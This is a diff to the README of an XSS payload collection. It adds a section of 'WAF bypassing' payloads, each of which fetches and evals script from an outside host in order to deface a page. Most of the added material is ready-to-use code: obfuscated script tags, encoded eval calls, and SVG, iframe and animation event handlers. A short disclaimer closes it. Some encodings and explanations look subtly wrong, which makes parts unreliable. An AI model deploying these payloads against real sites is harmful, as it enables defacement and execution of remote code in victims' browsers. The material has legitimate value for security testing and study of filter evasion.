@@ -3,22 +3,6 @@
 
 This repository contains various XSS (Cross-Site Scripting) deface payloads that can be used to load and execute external content. These payloads demonstrate different methods to achieve this, using various JavaScript techniques and libraries.
 
-## Table of Contents
-
-1. [Using jQuery to load and execute external content](#using-jquery-to-load-and-execute-external-content)
-2. [Using vanilla JavaScript to load and execute external content](#using-vanilla-javascript-to-load-and-execute-external-content)
-3. [Using XMLHttpRequest to load and execute external content](#using-xmlhttprequest-to-load-and-execute-external-content)
-4. [Using async/await with Fetch API](#using-asyncawait-with-fetch-api)
-5. [Using Axios to load and execute external content](#using-axios-to-load-and-execute-external-content)
-6. [Using the `DOMParser` API to load and execute external content](#using-the-domparser-api-to-load-and-execute-external-content)
-7. [Using `innerHTML` with a `div` element to load and execute external content](#using-innerhtml-with-a-div-element-to-load-and-execute-external-content)
-8. [Using `insertAdjacentHTML` to load and execute external content](#using-insertadjacenthtml-to-load-and-execute-external-content)
-9. [Using `document.write` to load and execute external content](#using-documentwrite-to-load-and-execute-external-content)
-10. [Using `iframe` to load and execute external content](#using-iframe-to-load-and-execute-external-content)
-11. [Using `innerHTML` with `template` element to load and execute external content](#using-innerhtml-with-template-element-to-load-and-execute-external-content)
-12. [Using `outerHTML` to load and execute external content](#using-outerhtml-to-load-and-execute-external-content)
-13. [Using `innerHTML` with `shadowRoot` to load and execute external content](#using-innerhtml-with-shadowroot-to-load-and-execute-external-content)
-
 
 
 ### Using `eval` with Fetch API
@@ -407,9 +391,147 @@ fetch('https://karthikdude.github.io/Deface/')
 
 **Details:** This payload creates a `div` element with a `shadowRoot`, sets the `innerHTML` of the `shadowRoot` to the fetched content, and then replaces the body of the document with the `shadowRoot`'s content. It also evaluates any script tags within the fetched content.
 
+
+---
+
+### **Advanced WAF Bypassing XSS Payloads**
+
+---
+
+####  **Unicode Obfuscation for Script Tags**
+
+```html
+<svg><script>x=String.fromCharCode;fetch('https://karthikdude.github.io/Deface/').then(r=>r.text()).then(c=>eval(c))</script>
+```
+
+**Details:**  
+- Uses `String.fromCharCode` to generate characters, avoiding direct script keywords.
+- Embedded `fetch` call loads an external script dynamically.
+
+---
+
+####  **Double URL Encoding**
+
+```html
+<iframe src="javascript&#58;&#x2f;&#x2f;eval&#x28;atob&#x28;'ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9J0hhY2tlZCEn'&#x29;&#x29;" style="border:0;width:100%;height:100%;"></iframe>
+```
+
+**Details:**  
+- Encodes `javascript:` and `eval()` using double URL encoding.
+- Decoded content defaces the page upon execution.
+
+---
+
+####  **Dynamic Attribute Injection**
+
+```html
+<a href="javascript:void(0)" id="x" onclick="fetch('https://karthikdude.github.io/Deface/').then(r=>r.text()).then(eval)">Click</a>
+<script>document.getElementById('x').setAttribute('onclick', atob('ZmV0Y2goJ2h0dHBzOi8va2FydGhpayd1ZGUuZ2l0aHViLmlvL0RlZmFjZS8nKS50aGVuKHIpLnRleHQoKS50aGVuKGV2YWwp'));</script>
+```
+
+**Details:**  
+- Dynamically injects obfuscated attributes to evade static WAF rules.
+- Uses `atob()` to decode the payload at runtime.
+
+---
+
+####  **Polyglot Payload with SVG**
+
+```html
+<svg/onload="fetch('https://karthikdude.github.io/Deface/').then(r=>r.text()).then(eval)">
+```
+
+**Details:**  
+- Uses the `onload` event in an SVG element to execute JavaScript.
+- Compact and effective against less rigorous WAFs.
+
+---
+
+####  **Case-Insensitive Keyword Mutation**
+
+```html
+<SvG><ScRiPt src="https://karthikdude.github.io/Deface/script.js"></sCrIpT></sVg>
+```
+
+**Details:**  
+- Capitalizes and mixes case in tag names to bypass case-sensitive WAF filters.
+- Loads an external defacement script.
+
+---
+
+####  **Null Byte Injection**
+
+```html
+<script src=https://karthikdude.github.io/Deface/script.js%00.js></script>
+```
+
+**Details:**  
+- Appends a null byte (`%00`) to the script URL to bypass strict file extension checks.
+- Effective against WAFs that validate `.js` extensions.
+
+---
+
+####  **HTML Entity Encoding**
+
+```html
+<script>&lt;img src=x onerror=eval(decodeURIComponent('%66%65%74%63%68%28%27https%3A%2F%2Fkarthikdude.github.io%2FDeface%2F%27%29%2E%74%68%65%6E%28%72%3D%3E%72%2E%74%65%78%74%28%29%29%2E%74%68%65%6E%28%65%76%61%6C%29'))&gt;</script>
+```
+
+**Details:**  
+- Encodes the payload in HTML entities to evade WAF pattern matching.
+- Decodes and executes the defacement payload at runtime.
+
+---
+
+####  **Chained Event Handlers**
+
+```html
+<div style="animation-name:rotate" onanimationstart="fetch('https://karthikdude.github.io/Deface/').then(r=>r.text()).then(eval)"></div>
+<style>@keyframes rotate {}</style>
+```
+
+**Details:**  
+- Uses the `animationstart` event to execute JavaScript when an animation begins.
+- Exploits non-standard event listeners.
+
+---
+
+####  **Inline SVG with Data URI**
+
+```html
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script><![CDATA[
+    fetch('https://karthikdude.github.io/Deface/')
+      .then(r => r.text())
+      .then(deface => { document.body.innerHTML = deface; });
+  ]]></script>
+</svg>
+```
+
+**Details:**  
+- Encodes the SVG payload inline, using `CDATA` to encapsulate JavaScript.
+- Bypasses filters targeting standard `<script>` elements.
+
+---
+
+####  **DOM-Based XSS with Trusted Context**
+
+```html
+<script>
+(function() {
+    const payload = document.createElement('iframe');
+    payload.src = 'javascript:fetch("https://karthikdude.github.io/Deface/").then(r=>r.text()).then(eval)';
+    document.body.appendChild(payload);
+})();
+</script>
+```
+
+**Details:**  
+- Dynamically creates an iframe element with a `javascript:` URL scheme.
+- Uses a trusted context (the DOM) to inject the malicious payload.
+
+
 ## Disclaimer
 
 These payloads are for educational purposes only. Always ensure you have proper authorization and are acting ethically when testing or using such payloads. Unauthorized use of these payloads can be illegal and unethical.
 ```
-
-This `README.md` file includes all the provided payloads along with the newly generated ones, each with detailed explanations.
